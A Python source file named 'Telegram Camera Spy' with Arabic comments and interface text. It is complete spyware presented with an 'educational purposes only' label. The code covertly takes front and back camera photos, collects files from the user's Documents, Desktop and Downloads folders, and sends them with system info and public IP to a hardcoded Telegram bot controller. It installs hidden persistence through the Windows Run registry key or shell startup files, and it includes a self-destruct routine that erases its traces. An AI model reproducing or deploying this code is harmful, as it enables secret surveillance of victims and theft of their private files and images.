#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PROJECT: "Telegram Camera Spy"
# AUTHOR: PhantomScriptVirus
# LEGAL: FOR EDUCATIONAL PURPOSES ONLY

import os
import sys
import base64
import shutil
import platform
import requests
import threading
import subprocess
import tempfile
import time
import telebot
from telebot import types

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = "6438089549:AAHbCWCGnF0GtdFygIBoHJWuRnX_zk_5aV8"
TELEGRAM_CHAT_ID = "6063558798"
SYSTEM_ID = base64.b64encode(os.getlogin().encode()).decode() if os.name != 'posix' else base64.b64encode(b"termux_device").decode()

# ===== GLOBAL STATE =====
CURRENT_PATH = os.path.abspath(sys.argv[0])
bot = telebot.TeleBot(TELEGRAM_TOKEN)
termux_mode = 'com.termux' in sys.executable

# ===== TELEGRAM CONTROL PANEL =====
def create_control_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("📸 كاميرا أمامية", callback_data="front_cam"),
        types.InlineKeyboardButton("📸 كاميرا خلفية", callback_data="back_cam"),
        types.InlineKeyboardButton("📂 ملفات النظام", callback_data="documents"),
        types.InlineKeyboardButton("📟 معلومات الجهاز", callback_data="sysinfo"),
        types.InlineKeyboardButton("💥 تدمير ذاتي", callback_data="destroy")
    ]
    keyboard.add(*buttons)
    return keyboard

def send_control_panel():
    try:
        bot.send_message(
            TELEGRAM_CHAT_ID,
            "🔷 *لوحة تحكم فانتوم* 🔷\n"
            f"`معرف الجهاز: {SYSTEM_ID}`\n"
            f"`النظام: {'Termux' if termux_mode else platform.system()}`\n"
            "اختر الإجراء المطلوب:",
            parse_mode="Markdown",
            reply_markup=create_control_keyboard()
        )
    except Exception as e:
        pass

# ===== CAMERA OPERATIONS WITHOUT CV2 =====
def capture_camera_termux(cam_index=0):
    """التقاط صورة باستخدام Termux-API"""
    try:
        img_path = os.path.join(tempfile.gettempdir(), f'cam_{cam_index}.jpg')
        result = subprocess.run(
            ["termux-camera-photo", "-c", str(cam_index), img_path],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0 and os.path.exists(img_path):
            with open(img_path, "rb") as img_file:
                return img_file.read()
        return None
    except:
        return None

def capture_camera_ffmpeg(cam_index=0):
    """التقاط صورة باستخدام FFmpeg"""
    try:
        img_path = os.path.join(tempfile.gettempdir(), f'ffmpeg_cam_{cam_index}.jpg')
        
        # بناء أمر FFmpeg بناءً على نظام التشغيل
        if platform.system() == "Darwin":  # macOS
            cmd = [
                "ffmpeg", "-f", "avfoundation", 
                "-i", f"{cam_index}", 
                "-frames:v", "1", 
                img_path
            ]
        elif platform.system() == "Linux":  # Linux
            cmd = [
                "ffmpeg", "-f", "v4l2", 
                "-i", f"/dev/video{cam_index}", 
                "-frames:v", "1", 
                img_path
            ]
        elif platform.system() == "Windows":  # Windows
            cmd = [
                "ffmpeg", "-f", "dshow", 
                "-i", f"video=Integrated Camera", 
                "-frames:v", "1", 
                img_path
            ]
        else:
            return None
            
        # تنفيذ الأمر
        subprocess.run(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=10
        )
        
        if os.path.exists(img_path):
            with open(img_path, "rb") as img_file:
                return img_file.read()
        return None
    except:
        return None

def capture_and_send(cam_index, cam_name):
    """التقاط وإرسال الصورة عبر التليجرام"""
    try:
        # تحديد طريقة التقاط الصورة
        if termux_mode:
            img_data = capture_camera_termux(cam_index)
        else:
            img_data = capture_camera_ffmpeg(cam_index)
        
        if img_data:
            with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmp:
                tmp.write(img_data)
                tmp_path = tmp.name
            
            with open(tmp_path, 'rb') as photo:
                bot.send_photo(TELEGRAM_CHAT_ID, photo, caption=f"📸 {cam_name}")
            
            os.unlink(tmp_path)
            return True
        else:
            bot.send_message(TELEGRAM_CHAT_ID, f"❌ فشل في التقاط {cam_name}")
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في الكاميرا: {str(e)}")
    return False

# ===== FILE OPERATIONS =====
def gather_documents():
    """جمع الملفات من المجلدات الشائعة"""
    try:
        base_path = os.path.expanduser('~')
        if termux_mode:
            search_paths = [
                os.path.join(base_path, 'storage', 'downloads'),
                os.path.join(base_path, 'storage', 'dcim'),
                os.path.join(base_path, 'storage', 'documents')
            ]
        else:
            search_paths = [
                os.path.join(base_path, 'Documents'),
                os.path.join(base_path, 'Desktop'),
                os.path.join(base_path, 'Downloads')
            ]
        
        targets = []
        for path in search_paths:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        targets.append(os.path.join(root, file))
        return targets
    except:
        return []

def send_documents():
    """إرسال الملفات المجمعة عبر التليجرام"""
    try:
        docs = gather_documents()
        if not docs:
            bot.send_message(TELEGRAM_CHAT_ID, "❌ لم يتم العثور على ملفات!")
            return
        
        bot.send_message(TELEGRAM_CHAT_ID, f"📁 العدد: {len(docs)} ملف. جارٍ إرسال أول 5...")
        
        for doc_path in docs[:5]:
            try:
                with open(doc_path, 'rb') as doc_file:
                    bot.send_document(
                        TELEGRAM_CHAT_ID, 
                        doc_file,
                        caption=f"📄 {os.path.basename(doc_path)}"
                    )
            except Exception as e:
                bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ فشل في إرسال الملف: {str(e)}")
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في الملفات: {str(e)}")

# ===== SYSTEM OPERATIONS =====
def get_system_info():
    """جمع معلومات النظام"""
    try:
        info = [
            f"النظام: {'Termux' if termux_mode else platform.system()}",
            f"الجهاز: {platform.node()}",
            f"الإصدار: {platform.release()}",
            f"المعالج: {platform.machine()}",
            f"المسار: {CURRENT_PATH}"
        ]
        
        # إضافة معلومات عنوان IP
        try:
            ip_info = requests.get('https://api.ipify.org?format=json').json()
            info.append(f"IP عام: {ip_info['ip']}")
        except:
            info.append("IP عام: غير معروف")
        
        return "\n".join(info)
    except:
        return "❌ فشل في جمع معلومات النظام"

# ===== SELF-DESTRUCT =====
def self_destruct():
    """التدمير الذاتي وإزالة جميع الآثار"""
    try:
        # إزالة الثبات من نظام Windows
        if os.name == 'nt':
            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                    winreg.DeleteValue(key, "CameraSpy")
            except:
                pass
        
        # إزالة الثبات من Termux
        if termux_mode:
            # إزالة من ملفات التشغيل التلقائي
            for rc_file in ['.bashrc', '.zshrc']:
                rc_path = os.path.expanduser(f'~/{rc_file}')
                if os.path.exists(rc_path):
                    with open(rc_path, 'r') as f:
                        lines = f.readlines()
                    with open(rc_path, 'w') as f:
                        for line in lines:
                            if CURRENT_PATH not in line:
                                f.write(line)
        
        # إنشاء سكريبت للحذف الذاتي
        if os.name == 'nt':
            batch_script = f"""
            @echo off
            chcp 65001 > nul
            timeout /t 3 /nobreak >nul
            del /f /q "{CURRENT_PATH}"
            del "%~f0"
            """
            ext = ".bat"
        else:
            batch_script = f"""#!/bin/bash
            sleep 3
            rm -f "{CURRENT_PATH}"
            rm -- "$0"
            """
            ext = ".sh"
        
        script_path = os.path.join(tempfile.gettempdir(), f'cleanup{ext}')
        with open(script_path, 'w') as f:
            f.write(batch_script)
        
        if os.name == 'nt':
            subprocess.Popen(['cmd.exe', '/C', script_path], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            os.chmod(script_path, 0o755)
            subprocess.Popen(['/bin/bash', script_path])
        
        bot.send_message(TELEGRAM_CHAT_ID, "💥 تم التدمير الذاتي! تم قطع الاتصال بالجهاز.")
        sys.exit(0)
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ فشل في التدمير الذاتي: {str(e)}")

# ===== TELEGRAM HANDLERS =====
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if str(message.chat.id) == TELEGRAM_CHAT_ID:
        send_control_panel()

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if str(call.message.chat.id) == TELEGRAM_CHAT_ID:
        if call.data == "front_cam":
            bot.answer_callback_query(call.id, "جارٍ التقاط الكاميرا الأمامية...")
            threading.Thread(target=lambda: capture_and_send(0, "كاميرا أمامية")).start()
        elif call.data == "back_cam":
            bot.answer_callback_query(call.id, "جارٍ التقاط الكاميرا الخلفية...")
            threading.Thread(target=lambda: capture_and_send(1, "كاميرا خلفية")).start()
        elif call.data == "documents":
            bot.answer_callback_query(call.id, "جارٍ جمع الملفات...")
            threading.Thread(target=send_documents).start()
        elif call.data == "sysinfo":
            bot.answer_callback_query(call.id, "جارٍ جمع معلومات النظام...")
            bot.send_message(TELEGRAM_CHAT_ID, f"```\n{get_system_info()}\n```", parse_mode="Markdown")
        elif call.data == "destroy":
            bot.answer_callback_query(call.id, "جارٍ التمهيد للتدمير الذاتي...")
            bot.send_message(TELEGRAM_CHAT_ID, "⚠️ تأكيد التدمير الذاتي؟ سيتم حذف البرنامج نهائيًا!", 
                             reply_markup=types.InlineKeyboardMarkup().row(
                                 types.InlineKeyboardButton("✅ تأكيد", callback_data="confirm_destroy"),
                                 types.InlineKeyboardButton("❌ إلغاء", callback_data="cancel_destroy")
                             ))
        elif call.data == "confirm_destroy":
            bot.answer_callback_query(call.id, "تم تأكيد التدمير الذاتي!")
            threading.Thread(target=self_destruct).start()
        elif call.data == "cancel_destroy":
            bot.answer_callback_query(call.id, "تم إلغاء التدمير الذاتي!")
            send_control_panel()

def telegram_polling():
    """تشغيل بوت التليجرام في وضع الاستطلاع"""
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            time.sleep(15)

# ===== PERSISTENCE =====
def install_persistence():
    """تركيب البرنامج للعمل عند بدء التشغيل"""
    # وضع Termux
    if termux_mode:
        try:
            # إنشاء مجلد الثبات
            persist_dir = os.path.expanduser("~/.phantom")
            os.makedirs(persist_dir, exist_ok=True)
            
            # نسخ الملف الحالي
            target_path = os.path.join(persist_dir, "phantom_cam")
            if not os.path.exists(target_path):
                shutil.copyfile(CURRENT_PATH, target_path)
                os.chmod(target_path, 0o755)
                CURRENT_PATH = target_path
            
            # إضافة إلى ملفات التشغيل التلقائي
            for rc_file in ['.bashrc', '.zshrc']:
                rc_path = os.path.expanduser(f'~/{rc_file}')
                startup_cmd = f"python {CURRENT_PATH} &\n"
                
                if not os.path.exists(rc_path):
                    with open(rc_path, 'w') as f:
                        f.write(startup_cmd)
                else:
                    with open(rc_path, 'r+') as f:
                        content = f.read()
                        if startup_cmd not in content:
                            f.write(startup_cmd)
        except:
            pass
    
    # نظام Windows
    elif os.name == 'nt':
        try:
            import winreg
            # نسخ إلى مجلد ProgramData
            target_dir = os.path.join(os.getenv('PROGRAMDATA'), "CameraSpy")
            os.makedirs(target_dir, exist_ok=True)
            target_path = os.path.join(target_dir, "camera_spy.exe")
            if not os.path.exists(target_path):
                shutil.copyfile(CURRENT_PATH, target_path)
                # إخفاء الملف
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)
                CURRENT_PATH = target_path
            
            # إضافة إلى التسجيل
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "CameraSpy", 0, winreg.REG_SZ, f'"{target_path}"')
        except:
            pass

# ===== MAIN =====
def main():
    # تركيب الثبات
    install_persistence()
    
    # إرسال إشعار الاتصال
    try:
        bot.send_message(
            TELEGRAM_CHAT_ID,
            f"🔥 جهاز جديد متصل! 🔥\n"
            f"```\n{get_system_info()}\n```",
            parse_mode="Markdown"
        )
        send_control_panel()
    except:
        pass

    # بدء تشغيل البوت
    threading.Thread(target=telegram_polling, daemon=True).start()
    
    # إبقاء البرنامج نشطًا
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
